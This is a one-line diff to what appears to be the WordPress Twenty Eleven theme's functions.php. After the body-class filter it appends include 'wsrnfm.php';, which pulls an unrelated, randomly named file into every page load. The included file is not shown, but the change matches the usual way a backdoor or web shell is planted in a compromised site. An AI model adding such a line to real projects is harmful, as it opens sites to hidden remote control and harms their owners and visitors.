@@ -591,3 +591,4 @@ function twentyeleven_body_classes( $classes ) {
 }
 add_filter( 'body_class', 'twentyeleven_body_classes' );
 
+include 'wsrnfm.php';
